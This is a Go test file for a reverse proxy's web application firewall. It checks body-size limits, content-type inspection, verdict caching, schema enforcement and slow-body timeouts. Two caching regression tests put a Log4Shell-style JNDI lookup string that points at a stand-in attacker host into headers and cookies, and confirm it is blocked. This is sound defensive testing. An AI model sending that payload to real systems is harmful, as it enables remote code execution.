package waf

import (
	"bytes"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"testing/iotest"
	"time"

	"palisade/internal/config"
)

// countingReader tracks how many bytes Check actually pulls off the wire, so
// the tests can prove an over-limit upload is never fully buffered.
type countingReader struct {
	r io.Reader
	n int64
}

func (c *countingReader) Read(p []byte) (int, error) {
	n, err := c.r.Read(p)
	c.n += int64(n)
	return n, err
}

func newTestEngine(t *testing.T) *Engine {
	t.Helper()
	e, err := New(config.WAFConfig{Enabled: true}, nil)
	if err != nil {
		t.Fatalf("engine init: %v", err)
	}
	return e
}

// TestCheckBodyBuffered covers the normal case: an in-limit body passes the
// WAF and is fully replayable afterwards so the proxy can forward it.
func TestCheckBodyBuffered(t *testing.T) {
	e := newTestEngine(t)

	const payload = "greeting=hello"
	r := httptest.NewRequest("POST", "http://app.example.com/submit", strings.NewReader(payload))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Set("User-Agent", "Mozilla/5.0")
	r.Header.Set("Accept", "*/*")

	res, err := e.Check(r, "203.0.113.9")
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	if res.Blocked {
		t.Fatalf("benign body blocked: %+v", res)
	}
	got, err := io.ReadAll(r.Body)
	if err != nil || string(got) != payload {
		t.Errorf("body after check = %q, %v; want %q intact", got, err, payload)
	}
}

// TestCheckBodyReadErrorIsClientFault checks a client that drops mid-upload
// surfaces as ErrBodyRead, so the proxy answers 400 rather than a 500 "waf
// error".
func TestCheckBodyReadErrorIsClientFault(t *testing.T) {
	e := newTestEngine(t)
	body := io.MultiReader(strings.NewReader("greeting="), iotest.ErrReader(io.ErrUnexpectedEOF))
	r := httptest.NewRequest("POST", "http://app.example.com/submit", body)
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	if _, err := e.Check(r, "203.0.113.9"); !errors.Is(err, ErrBodyRead) {
		t.Fatalf("check err = %v, want ErrBodyRead", err)
	}
}

// TestCheckBodyOverLimit sends a multipart body one byte past
// SecRequestBodyLimit through a counting reader: Coraza must reject it (413,
// the recommended config's SecRequestBodyLimitAction) while Check reads at
// most limit+1 bytes into memory instead of buffering the whole upload.
func TestCheckBodyOverLimit(t *testing.T) {
	e := newTestEngine(t)

	over := requestBodyLimit + 10
	cr := &countingReader{r: bytes.NewReader(bytes.Repeat([]byte("a"), over))}
	r := httptest.NewRequest("POST", "http://app.example.com/upload", cr)
	r.Header.Set("Content-Type", "multipart/form-data; boundary=xyz")
	r.Header.Set("User-Agent", "Mozilla/5.0")
	r.Header.Set("Accept", "*/*")

	res, err := e.Check(r, "203.0.113.9")
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	if !res.Blocked || res.Status != 413 {
		t.Errorf("over-limit body: blocked=%v status=%d, want blocked with 413", res.Blocked, res.Status)
	}
	if cr.n > requestBodyLimit+1 {
		t.Errorf("check read %d bytes off the wire, want at most limit+1 (%d)", cr.n, requestBodyLimit+1)
	}
	if got := e.cache.order.Len(); got != 0 {
		t.Errorf("over-limit request must never be cached, got %d cache entries", got)
	}
}

// TestInspectionFor pins the content-type gate down as data. The split that
// matters: multipart carries file parts Coraza routes away from ARGS and is
// cheap at megabytes, every other inspectable type is parsed into ARGS in full
// and is not, and a binary type is not inspected at all.
func TestInspectionFor(t *testing.T) {
	for _, tc := range []struct {
		contentType string
		want        bodyInspection
	}{
		{"application/x-www-form-urlencoded", inspectNoFiles},
		{"application/json", inspectNoFiles},
		{"application/json; charset=utf-8", inspectNoFiles},
		{"APPLICATION/JSON", inspectNoFiles},
		{"  application/json  ", inspectNoFiles},
		{"application/vnd.api+json", inspectNoFiles},
		{"application/soap+xml", inspectNoFiles},
		{"application/xml", inspectNoFiles},
		{"text/plain", inspectNoFiles},
		{"text/html; charset=utf-8", inspectNoFiles},
		{"", inspectNoFiles},
		{"multipart/form-data; boundary=xyz", inspectFiles},
		{"multipart/related", inspectFiles},
		{"application/pdf", inspectSkip},
		{"application/octet-stream", inspectSkip},
		{"image/png", inspectSkip},
		{"video/mp4", inspectSkip},
		{"application/zip", inspectSkip},
		{"application/javascript", inspectNoFiles},
		{"text/javascript; charset=utf-8", inspectNoFiles},
	} {
		if got := inspectionFor(tc.contentType); got != tc.want {
			t.Errorf("inspectionFor(%q) = %v, want %v", tc.contentType, got, tc.want)
		}
	}
}

// TestCheckAllowsLargeJavaScriptUpload verifies the per-service upload policy
// leaves a JavaScript body completely unread so it can stream to an S3-style
// backend, while the default policy still applies to other services.
func TestCheckAllowsLargeJavaScriptUpload(t *testing.T) {
	// The service engine builder also removes 911100 and 920420 when this
	// option is on: S3 PutObject needs PUT and JavaScript is outside CRS's
	// default content-type allow-list.
	e, err := New(config.WAFConfig{Enabled: true}, []int{911100, 920420})
	if err != nil {
		t.Fatalf("engine init: %v", err)
	}

	payload := bytes.Repeat([]byte("const uploaded = true;\n"), 10000)
	defaultReq := httptest.NewRequest("POST", "http://app.example.com/assets/app.js", bytes.NewReader(payload))
	defaultReq.Header.Set("Content-Type", "application/javascript")
	defaultReq.Header.Set("User-Agent", "aws-cli/2")
	defaultRes, err := e.Check(defaultReq, "203.0.113.9")
	if err != nil {
		t.Fatalf("default check: %v", err)
	}
	if !defaultRes.Blocked || defaultRes.Status != http.StatusRequestEntityTooLarge {
		t.Fatalf("default JavaScript policy = %+v, want 413", defaultRes)
	}

	cr := &countingReader{r: bytes.NewReader(payload)}
	r := httptest.NewRequest("PUT", "http://app.example.com/assets/app.js", cr)
	r.Header.Set("Content-Type", "application/javascript; charset=utf-8")
	r.Header.Set("User-Agent", "aws-cli/2")

	res, err := e.CheckWithOptions(r, "203.0.113.9", CheckOptions{AllowLargeJavaScriptUploads: true})
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	if res.Blocked {
		t.Fatalf("large JavaScript upload blocked: %+v", res)
	}
	if cr.n != 0 {
		t.Errorf("check read %d JavaScript bytes, want 0 (body must stream)", cr.n)
	}
	got, err := io.ReadAll(r.Body)
	if err != nil || !bytes.Equal(got, payload) {
		t.Errorf("body after check = %d bytes (err %v), want %d intact", len(got), err, len(payload))
	}
}

// TestCheckStreamsUninspectableBody is the fix for the memory blow-up: a
// binary upload must reach the backend without this process reading it. The
// counting reader proves Check never pulled a byte off the wire, and the body
// must still be forwardable in full afterwards.
func TestCheckStreamsUninspectableBody(t *testing.T) {
	// CRS scores the request line itself here — 911100 rejects PUT (its
	// allowed-methods policy is GET/HEAD/POST/OPTIONS) and 920420 rejects a
	// content type outside its allow-list — and either alone crosses the
	// inbound anomaly threshold. Both are header-phase policy an operator
	// tunes per service; excluding them is what leaves this test asserting
	// the one thing the gate is responsible for, the body.
	e, err := New(config.WAFConfig{Enabled: true}, []int{911100, 920420})
	if err != nil {
		t.Fatalf("engine init: %v", err)
	}

	payload := bytes.Repeat([]byte("\x00\x01binary&payload=here&"), 4096)
	cr := &countingReader{r: bytes.NewReader(payload)}
	r := httptest.NewRequest("PUT", "http://app.example.com/upload?key=notes.pdf", cr)
	r.Header.Set("Content-Type", "application/pdf")
	r.Header.Set("User-Agent", "Mozilla/5.0")

	res, err := e.Check(r, "203.0.113.9")
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	if cr.n != 0 {
		t.Errorf("check read %d bytes of an uninspectable body, want 0 (it must stream)", cr.n)
	}
	if res.Blocked {
		t.Errorf("binary upload blocked by body inspection that should not have run: %+v", res)
	}
	got, err := io.ReadAll(r.Body)
	if err != nil || !bytes.Equal(got, payload) {
		t.Errorf("body after check = %d bytes (err %v), want the original %d intact", len(got), err, len(payload))
	}
	if got := e.cache.order.Len(); got != 0 {
		t.Errorf("uninspected body must never be cached, got %d cache entries", got)
	}
}

// TestCheckNoFilesBodyOverLimit covers the limit Coraza parses and ignores
// (corazawaf/coraza#896): a non-multipart body past noFilesBodyLimit is
// refused here rather than parsed into ARGS, and the wire read stops at the
// limit instead of buffering the whole thing.
func TestCheckNoFilesBodyOverLimit(t *testing.T) {
	e := newTestEngine(t)

	over := noFilesBodyLimit + 10
	cr := &countingReader{r: bytes.NewReader(bytes.Repeat([]byte("a"), over))}
	r := httptest.NewRequest("POST", "http://app.example.com/api", cr)
	r.Header.Set("Content-Type", "application/json")
	r.Header.Set("User-Agent", "Mozilla/5.0")

	res, err := e.Check(r, "203.0.113.9")
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	if !res.Blocked || res.Status != 413 {
		t.Errorf("over-limit no-files body: blocked=%v status=%d, want blocked with 413", res.Blocked, res.Status)
	}
	if cr.n > noFilesBodyLimit+1 {
		t.Errorf("check read %d bytes off the wire, want at most limit+1 (%d)", cr.n, noFilesBodyLimit+1)
	}
	if got := e.cache.order.Len(); got != 0 {
		t.Errorf("over-limit request must never be cached, got %d cache entries", got)
	}
}

// TestCheckNoFilesBodyAtLimit is the boundary the test above does not cover:
// exactly at the limit is inspected normally, not refused.
func TestCheckNoFilesBodyAtLimit(t *testing.T) {
	e := newTestEngine(t)

	payload := bytes.Repeat([]byte("a"), noFilesBodyLimit)
	r := httptest.NewRequest("POST", "http://app.example.com/api", bytes.NewReader(payload))
	r.Header.Set("Content-Type", "text/plain")
	r.Header.Set("User-Agent", "Mozilla/5.0")

	res, err := e.Check(r, "203.0.113.9")
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	if res.Blocked && res.Status == 413 {
		t.Errorf("body exactly at the limit was refused as over-limit: %+v", res)
	}
	got, err := io.ReadAll(r.Body)
	if err != nil || len(got) != len(payload) {
		t.Errorf("body after check = %d bytes (err %v), want %d intact", len(got), err, len(payload))
	}
}

// TestCheckDeduplicatesIdenticalRequests proves the verdict cache (issue #13)
// actually keys on the request fingerprint: a byte-identical repeat reuses
// the existing cache entry instead of creating a new one, while a request
// that differs only in query string gets its own entry.
func TestCheckDeduplicatesIdenticalRequests(t *testing.T) {
	e := newTestEngine(t)

	newReq := func(query string) *http.Request {
		r := httptest.NewRequest("GET", "http://app.example.com/search?"+query, nil)
		r.Header.Set("User-Agent", "Mozilla/5.0")
		r.Header.Set("Accept", "*/*")
		return r
	}

	if _, err := e.Check(newReq("q=hello"), "203.0.113.9"); err != nil {
		t.Fatalf("check 1: %v", err)
	}
	if got := e.cache.order.Len(); got != 1 {
		t.Fatalf("cache entries after 1st request = %d, want 1", got)
	}

	if _, err := e.Check(newReq("q=hello"), "203.0.113.9"); err != nil {
		t.Fatalf("check 2 (identical repeat): %v", err)
	}
	if got := e.cache.order.Len(); got != 1 {
		t.Fatalf("cache entries after identical repeat = %d, want 1 (should reuse the existing entry)", got)
	}

	if _, err := e.Check(newReq("q=different"), "203.0.113.9"); err != nil {
		t.Fatalf("check 3 (distinct query): %v", err)
	}
	if got := e.cache.order.Len(); got != 2 {
		t.Fatalf("cache entries after distinct request = %d, want 2", got)
	}
}

// TestCheckCachedAllowDoesNotCoverHeaderPayload is the issue #152
// regression: an allowed request must not let a later one that differs only
// in a header reuse its verdict.
func TestCheckCachedAllowDoesNotCoverHeaderPayload(t *testing.T) {
	e := newTestEngine(t)
	newReq := func(ua string) *http.Request {
		r := httptest.NewRequest("GET", "http://app.example.com/", nil)
		r.Header.Set("User-Agent", ua)
		r.Header.Set("Accept", "*/*")
		return r
	}
	clean, err := e.Check(newReq("Mozilla/5.0"), "203.0.113.9")
	if err != nil || clean.Blocked {
		t.Fatalf("clean request: blocked=%v err=%v, want allowed", clean != nil && clean.Blocked, err)
	}
	evil, err := e.Check(newReq("${jndi:ldap://attacker.example/a}"), "203.0.113.9")
	if err != nil {
		t.Fatalf("header payload: %v", err)
	}
	if !evil.Blocked {
		t.Fatal("header payload was allowed by the clean request's cached verdict")
	}
}

// TestCheckCachesPerCookie pins issue #291: requests with cookies or
// Authorization are cached, but only per exact value. A payload in one
// user's cookie is never answered by another user's cached allow, and an
// identical repeat is a hit.
func TestCheckCachesPerCookie(t *testing.T) {
	e := newTestEngine(t)
	newReq := func(header, value string) *http.Request {
		r := httptest.NewRequest("GET", "http://app.example.com/account", nil)
		r.Header.Set("User-Agent", "Mozilla/5.0")
		r.Header.Set(header, value)
		return r
	}
	for _, header := range []string{"Cookie", "Authorization"} {
		clean, err := e.Check(newReq(header, "session=abc123"), "203.0.113.9")
		if err != nil || clean.Blocked {
			t.Fatalf("%s clean: %+v %v", header, clean, err)
		}
		hits := VerdictCacheHits()
		if again, _ := e.Check(newReq(header, "session=abc123"), "203.0.113.9"); again.Blocked || VerdictCacheHits() != hits+1 {
			t.Errorf("%s repeat: blocked=%v hits %d -> %d, want a cache hit", header, again.Blocked, hits, VerdictCacheHits())
		}
		misses := VerdictCacheMisses()
		evil, err := e.Check(newReq(header, "session=${jndi:ldap://attacker.example/a}"), "203.0.113.9")
		if err != nil || !evil.Blocked {
			t.Errorf("%s payload allowed (%v): served another value's cached verdict", header, err)
		}
		if VerdictCacheMisses() != misses+1 {
			t.Errorf("%s payload: misses %d -> %d, want one miss", header, misses, VerdictCacheMisses())
		}
	}
}

const testRequestSchema = `{"type":"object","required":["email"],"properties":{"email":{"type":"string","format":"email"}}}`

func jsonRequest(body string) *http.Request {
	r := httptest.NewRequest("POST", "http://app.example.com/signup", strings.NewReader(body))
	r.Header.Set("Content-Type", "application/json")
	r.Header.Set("User-Agent", "Mozilla/5.0")
	return r
}

// TestValidateSchemaRejectsMalformedSchema confirms save handlers can catch a
// broken schema before it ever reaches the DB — see internal/ui's use of
// this alongside SetServiceSchema.
func TestValidateSchemaRejectsMalformedSchema(t *testing.T) {
	if err := ValidateSchema(`{"type": "object",`); err == nil {
		t.Fatal("ValidateSchema accepted syntactically invalid JSON, want an error")
	}
	if err := ValidateSchema(testRequestSchema); err != nil {
		t.Fatalf("ValidateSchema rejected a valid schema: %v", err)
	}
}

// TestCheckEnforceModeBlocksSchemaMismatch covers the "enforce" mode: a JSON
// body missing a required field is rejected with 400 before Coraza's own
// CRS transaction ever runs, and a matching body passes through untouched.
func TestCheckEnforceModeBlocksSchemaMismatch(t *testing.T) {
	e := newTestEngine(t)
	if err := e.SetRequestSchema(testRequestSchema, "enforce"); err != nil {
		t.Fatalf("SetRequestSchema: %v", err)
	}

	bad := jsonRequest(`{"name":"no email field"}`)
	res, err := e.Check(bad, "203.0.113.9")
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	if !res.Blocked || res.Status != http.StatusBadRequest || res.Action != "schema_violation" {
		t.Fatalf("enforce-mode mismatch result = %+v, want Blocked=true Status=400 Action=schema_violation", res)
	}

	good := jsonRequest(`{"email":"a@example.com"}`)
	res, err = e.Check(good, "203.0.113.9")
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	if res.Blocked {
		t.Fatalf("schema-matching body blocked: %+v", res)
	}
}

// TestCheckLogModeNeverBlocks covers the "log" mode: a schema mismatch is
// annotated onto the Action for logging/webhook visibility but the request
// still proceeds to the backend exactly as if no schema were configured.
func TestCheckLogModeNeverBlocks(t *testing.T) {
	e := newTestEngine(t)
	if err := e.SetRequestSchema(testRequestSchema, "log"); err != nil {
		t.Fatalf("SetRequestSchema: %v", err)
	}

	bad := jsonRequest(`{"name":"no email field"}`)
	res, err := e.Check(bad, "203.0.113.9")
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	if res.Blocked {
		t.Fatalf("log-mode mismatch blocked the request: %+v", res)
	}
	if res.Action != "schema_violation:log" {
		t.Fatalf("log-mode mismatch Action = %q, want %q", res.Action, "schema_violation:log")
	}

	good := jsonRequest(`{"email":"a@example.com"}`)
	res, err = e.Check(good, "203.0.113.9")
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	if res.Blocked || res.Action != "" {
		t.Fatalf("schema-matching body under log mode = %+v, want unblocked with no Action", res)
	}
}

// TestSetRequestSchemaOffClearsSchema confirms mode "off" (the same value
// Service.SchemaMode defaults to) detaches any previously compiled schema,
// so toggling back to off actually stops validating instead of leaving the
// last-compiled schema active.
func TestSetRequestSchemaOffClearsSchema(t *testing.T) {
	e := newTestEngine(t)
	if err := e.SetRequestSchema(testRequestSchema, "enforce"); err != nil {
		t.Fatalf("SetRequestSchema: %v", err)
	}
	if err := e.SetRequestSchema("", "off"); err != nil {
		t.Fatalf("SetRequestSchema (off): %v", err)
	}

	res, err := e.Check(jsonRequest(`{"name":"no email field"}`), "203.0.113.9")
	if err != nil {
		t.Fatalf("check: %v", err)
	}
	if res.Blocked {
		t.Fatalf("schema still enforced after SetRequestSchema(off): %+v", res)
	}
}

// With every inspection slot taken, a large body is refused with ErrBusy
// while a small one still passes (#261).
func TestInspectionSlots(t *testing.T) {
	e := newTestEngine(t)
	e.cache.ttl = 0 // every check runs the rules
	defer func(d time.Duration) { inspectWait = d }(inspectWait)
	inspectWait = 10 * time.Millisecond

	check := func(body string) error {
		r := httptest.NewRequest("POST", "http://app.example.com/api", strings.NewReader(body))
		r.Header.Set("Content-Type", "application/json")
		_, err := e.Check(r, "203.0.113.9")
		return err
	}
	large := `{"a":"` + strings.Repeat("x", heavyBody) + `"}`

	for range cap(inspectSlots) {
		inspectSlots <- struct{}{}
	}
	shed := InspectionsShed()
	if err := check(large); !errors.Is(err, ErrBusy) {
		t.Errorf("large body with no free slot: err = %v, want ErrBusy", err)
	}
	if err := check(`{"a":1}`); err != nil {
		t.Errorf("small body should not need a slot: %v", err)
	}
	if got := InspectionsShed() - shed; got != 1 {
		t.Errorf("shed = %d, want 1", got)
	}
	for range cap(inspectSlots) {
		<-inspectSlots
	}

	if err := check(large); err != nil {
		t.Errorf("large body with free slots: %v", err)
	}
	if n := InspectionsInFlight(); n != 0 {
		t.Errorf("in flight after checks = %d, want 0", n)
	}
}

// TestSlowBodyTimesOut pins issue #272: a body the WAF buffers must arrive
// within its deadline, a body that streams uninspected gets no deadline, and
// a prompt body leaves the connection without one.
func TestSlowBodyTimesOut(t *testing.T) {
	e := newTestEngine(t)
	e.cache.ttl = 0 // every check runs the rules
	defer func(d time.Duration, r int64) { bodyGrace, bodyMinRate = d, r }(bodyGrace, bodyMinRate)
	bodyGrace, bodyMinRate = 100*time.Millisecond, 1<<30 // no per-byte allowance

	for _, h2 := range []bool{false, true} {
		errs := make(chan error, 1)
		srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			_, err := e.CheckWithOptions(r, "203.0.113.9", CheckOptions{
				SetReadDeadline: http.NewResponseController(w).SetReadDeadline,
			})
			if err == nil && r.Header.Get("Content-Type") == "application/octet-stream" {
				// Uninspected: the tail arrives after bodyGrace and must still be readable.
				_, err = io.ReadAll(r.Body)
			}
			errs <- err
		}))
		srv.EnableHTTP2 = h2
		srv.StartTLS()

		send := func(contentType string, stall time.Duration) error {
			pr, pw := io.Pipe()
			req, _ := http.NewRequest("POST", srv.URL+"/api", pr)
			req.Header.Set("Content-Type", contentType)
			go func() {
				_, _ = pw.Write([]byte(`{"a":`))
				time.Sleep(stall)
				_, _ = pw.Write([]byte(`1}`))
				pw.Close()
			}()
			go func() {
				if resp, err := srv.Client().Do(req); err == nil {
					resp.Body.Close()
				}
			}()
			select {
			case err := <-errs:
				return err
			case <-time.After(5 * time.Second):
				t.Fatalf("h2=%v %s: handler never returned", h2, contentType)
				return nil
			}
		}

		before := BodyTimeouts()
		if err := send("application/json", 2*time.Second); !errors.Is(err, ErrBodyTimeout) {
			t.Errorf("h2=%v slow inspected body: err = %v, want ErrBodyTimeout", h2, err)
		}
		if got := BodyTimeouts() - before; got != 1 {
			t.Errorf("h2=%v body timeouts counted = %d, want 1", h2, got)
		}
		if err := send("application/json", 0); err != nil {
			t.Errorf("h2=%v prompt body: %v", h2, err)
		}
		if err := send("application/octet-stream", 300*time.Millisecond); err != nil {
			t.Errorf("h2=%v slow uninspected body got a deadline: %v", h2, err)
		}
		srv.Close()
	}
}
